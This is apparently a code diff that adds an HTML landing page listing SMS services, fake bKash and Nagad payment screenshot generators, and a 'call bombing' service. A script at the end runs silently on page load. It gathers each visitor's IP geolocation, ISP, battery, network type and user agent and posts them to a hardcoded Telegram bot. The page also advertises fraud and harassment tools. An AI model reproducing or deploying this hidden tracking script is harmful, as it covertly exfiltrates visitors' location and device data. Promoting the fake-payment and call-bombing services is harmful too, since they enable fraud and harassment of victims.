@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service List</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Global Styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #4a90e2;
+            color: white;
+            padding: 2rem;
+            text-align: center;
+            font-size: 1.5rem;
+            letter-spacing: 1px;
+        }
+
+        main {
+            padding: 2rem;
+        }
+
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background-color: #4a90e2;
+            color: white;
+        }
+
+        /* Service List Styles */
+        .service-list {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .service-item {
+            background-color: #fff;
+            padding: 1.5rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            margin: 1.5rem 0;
+            opacity: 0;
+            transform: translateY(100px);
+            transition: opacity 0.6s ease, transform 0.6s ease, background-color 0.4s ease;
+            display: flex;
+            align-items: center;
+        }
+
+        .service-item h2 {
+            color: #333;
+            margin-bottom: 0.5rem;
+            margin-left: 10px;
+        }
+
+        .service-item p {
+            color: #666;
+            margin-bottom: 1rem;
+            margin-left: 10px;
+        }
+
+        .service-item i {
+            font-size: 2.5rem;
+            color: #4a90e2;
+        }
+
+        /* Different colors for each item */
+        .service-item:nth-child(1) {
+            background-color: #e1f5fe;
+        }
+        .service-item:nth-child(2) {
+            background-color: #e8f5e9;
+        }
+        .service-item:nth-child(3) {
+            background-color: #fff3e0;
+        }
+        .service-item:nth-child(4) {
+            background-color: #fce4ec;
+        }
+        .service-item:nth-child(5) {
+            background-color: #e8f0fe;
+        }
+        .service-item:nth-child(6) {
+            background-color: #ffe0b2;
+        }
+
+        .service-item:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .service-item:active {
+            transform: scale(0.98);
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 0.5rem 1rem;
+            background-color: #4a90e2;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .btn:hover {
+            background-color: #357abd;
+        }
+
+        /* Miss Call Specific Styles */
+        .miss-call i {
+            color: #e57373;
+        }
+
+        .miss-call:hover {
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+
+        /* Scroll Animation */
+        .show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+        <header><font size="10">Services</font>
+        
+        <center><p><font size="4">Developed by ❤️ Hasan</font></p></center>
+    </header>
+    <main>
+        <ul class="service-list">
+            <li class="service-item">
+                <i class="fas fa-sms"></i>
+                <div>
+                    <h2>Half SMS Service</h2>
+                    <p>Send personalized SMS to any recipient.</p>
+                    <a href="https://yttrium02.serv00.net/sms-list.html" class="btn">Go to Half SMS</a>
+                </div>
+            </li>
+            <li class="service-item">
+                <i class="fas fa-envelope"></i>
+                <div>
+                    <h2>Custom SMS Service</h2>
+                    <p>Send SMS to multiple recipients at once.</p>
+                    <a href="https://yttrium02.serv00.net/comingsoon.html" class="btn">Go to Bulk SMS</a>
+                </div>
+            </li>
+            <li class="service-item">
+                <i class="fas fa-clock"></i>
+                <div>
+                    <h2>Scheduled SMS Service</h2>
+                    <p>Schedule SMS to be sent at a specific time.</p>
+                    <a href="https://yttrium02.serv00.net/comingsoon.html" class="btn">Go to Scheduled SMS</a>
+                </div>
+            </li>
+            <li class="service-item">
+                <i class="fas fa-money-check-alt"></i>
+                <div>
+                    <h2>Bkash fake screenshot</h2>
+                    <p>Generate send money or make payments fake screenshot.</p>
+                    <a href="https://yttrium02.serv00.net/comingsoon.html" class="btn">Go to Bkash Service</a>
+                </div>
+            </li>
+            <li class="service-item">
+                <i class="fas fa-wallet"></i>
+                <div>
+                    <h2>Nagad fake screenshot</h2>
+                    <p>Generate send money or make payments screenshot using Nagad.</p>
+                    <a href="https://yttrium02.serv00.net/comingsoon.html" class="btn">Go to Nagad Service</a>
+                </div>
+            </li>
+            <li class="service-item miss-call">
+                <i class="fas fa-phone-volume"></i>
+                <div>
+                    <h2>Call bombing Service</h2>
+                    <p>Trigger automated actions by receiving a miss call.</p>
+                    <a href="https://yttrium02.serv00.net/comingsoon.html" class="btn">Go to Call Service</a>
+                </div>
+            </li>
+        </ul>
+    </main>
+
+    <footer>
+        &copy; 2024 Bulk SMS Sender Service
+    </footer>
+
+    <script>
+        // Scroll Animation
+        window.addEventListener('scroll', () => {
+            const serviceItems = document.querySelectorAll('.service-item');
+            const triggerBottom = window.innerHeight * 0.85;
+
+            serviceItems.forEach(item => {
+                const itemTop = item.getBoundingClientRect().top;
+
+                if (itemTop < triggerBottom) {
+                    item.classList.add('show');
+                } else {
+                    item.classList.remove('show');
+                }
+            });
+        });
+
+        // Initial trigger to check scroll position on page load
+        window.dispatchEvent(new Event('scroll'));
+    </script>
+  <script>// Function to get IP Address information using ip-api.com
+async function getIPInfo() {
+    const response = await fetch('http://ip-api.com/json/?fields=ip,city,regionName,country,zip,lat,lon,isp,org,as,query');
+    const data = await response.json();
+    return data;
+}
+
+// Function to get Battery Information
+async function getBatteryInfo() {
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return {
+            level: (battery.level * 100) + '%',
+            charging: battery.charging ? 'Yes' : 'No'
+        };
+    }
+    return {
+        level: 'N/A',
+        charging: 'N/A'
+    };
+}
+
+// Function to get Network Information
+function getNetworkInfo() {
+    if (navigator.connection) {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return connection.effectiveType || 'N/A';
+    }
+    return 'N/A';
+}
+
+// Function to get User Agent
+function getUserAgent() {
+    return navigator.userAgent;
+}
+
+// Function to send data to Telegram
+async function sendToTelegram(message) {
+    const botToken = '6696317970:AAH1NZPjLjwD_8Jav73izvSqtDKL9qGpMBE'; // Replace with your bot token
+    const chatId = '5624278091'; // Replace with your chat ID
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        }),
+    });
+}
+
+// Main function to collect data and send to Telegram
+async function collectAndSendData() {
+    const ipInfo = await getIPInfo();
+    const battery = await getBatteryInfo();
+    const networkType = getNetworkInfo();
+    const userAgent = getUserAgent();
+    const time = new Date().toLocaleString();
+
+    const message = `
+✦───────────────────✦「page title: ${document.title}」️ ✦───────────────────✦
+
+┌────────⭓
+├⪦ ∷City: ${ipInfo.city}
+├⪦ ∷Region: ${ipInfo.regionName}
+├⪦ ∷Country: ${ipInfo.country}
+├⪦ ∷ZIP: ${ipInfo.zip}
+├⪦ ∷Latitude: ${ipInfo.lat}
+├⪦ ∷Longitude: ${ipInfo.lon}
+├⪦ ∷ISP: ${ipInfo.isp}
+├⪦ ∷Organization: ${ipInfo.org}
+├⪦ ∷AS: ${ipInfo.as}
+└────────────────⧕
+
+✦────────────────────✦
+├⪦ ∷Network Type: ${networkType}
+├⪦ ∷Battery Level: ${battery.level}
+├⪦ ∷Battery Charging: ${battery.charging}
+└────────────────────
+
+✦────────────────────✦
+UserAgent: ${userAgent}
+✦────────────────────✦
+    `;
+
+    await sendToTelegram(message);
+}
+
+// Call the function when the page loads
+window.onload = collectAndSendData;
+</script>
+  
+</body>
+</html>
